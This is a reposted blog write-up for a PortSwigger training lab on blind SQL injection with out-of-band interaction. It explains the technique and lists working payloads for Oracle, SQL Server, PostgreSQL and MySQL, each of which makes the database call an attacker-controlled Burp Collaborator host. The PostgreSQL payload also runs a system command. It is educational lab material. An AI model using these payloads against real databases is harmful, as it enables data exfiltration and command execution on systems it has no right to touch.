# :game_die: Day 16: Blind SQL injection with out-of-band interaction- Zero to Hero out-of-band - Portswigger

> **Original Source:** [Day 16: Blind SQL injection with out-of-band interaction- Zero to Hero out-of-band - Portswigger](https://infosecwriteups.com/day-16-blind-sql-injection-with-out-of-band-interaction-zero-to-hero-out-of-band-portswigger-80cca693aa03)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

# Day 16: Blind SQL injection with out-of-band interaction— Zero to Hero out-of-band — Portswigger


Hi, my fellow hackers. This is Rayofhope. I have over 5 years of experience and am currently working as a consultant with a Big 4 firm.


It’s Day 16 of posting all the PortSwigger labs, not just the solutions. I’ll break down *why*we take each step, because once the *‘why’ is clear, the ‘how’ becomes easy.*Let’s Start:


What is Out-of-Band SQL Injection?

>

OOB SQLi is a type of SQL injection where the attacker receives data through a different channel (*like DNS or HTTP*) instead of directly through the web application response.


When to use Out-of-Band SQL Injection?

>

When in-band (normal response-based) or inferential (blind SQLi) techniques don’t work.
Example: No Response, No Error, No True/False Condition works there we can try OOB.


Note:

>

Out-of-band Sql Injection is only possible if the server that you are using has commands that trigger DNS or HTTP requests.


What are the prerequisites to happen OOB

>

The database server must have outbound network connectivity (e.g., access to the internet).
Certain functions or features must be enabled in the database (e.g., `xp_dirtree`, `load_file()`, `UTL_HTTP`, etc.).
The attacker must control a DNS or HTTP server to receive the outgoing requests. Example: Burp Collabrator.


All major databases support OOB SQLi under certain conditions:

>

SQL Server: via `xp_dirtree`, `xp_cmdshell`, `openrowset`.
Oracle: via `UTL_HTTP`, `DBMS_LDAP`, etc.
MySQL: via `load_file()`, `select into outfile`, etc.
PostgreSQL: using functions like `COPY`, `COPY TO PROGRAM`.


SQL Payload for OOB for different kinds of databases:


- Oracle database:
(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched, but there are many unpatched Oracle installations in existence:


Even on fully patched Oracle databases, network-related packages like `UTL_INADDR` can be abused if the attacker has elevated privileges.
*Select Utl_Inaddr.get_host_address(‘Burp-Collaborator-Subdomain’) from dual*


- Microsoft`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`

- PostgreSQL`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`

- MySQL: The following techniques work on Windows only:

- `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`
`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`


“We have understood the basis of OOB, now let’s solve the lab.

---

*Originally published on [Medium](https://infosecwriteups.com/day-16-blind-sql-injection-with-out-of-band-interaction-zero-to-hero-out-of-band-portswigger-80cca693aa03). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
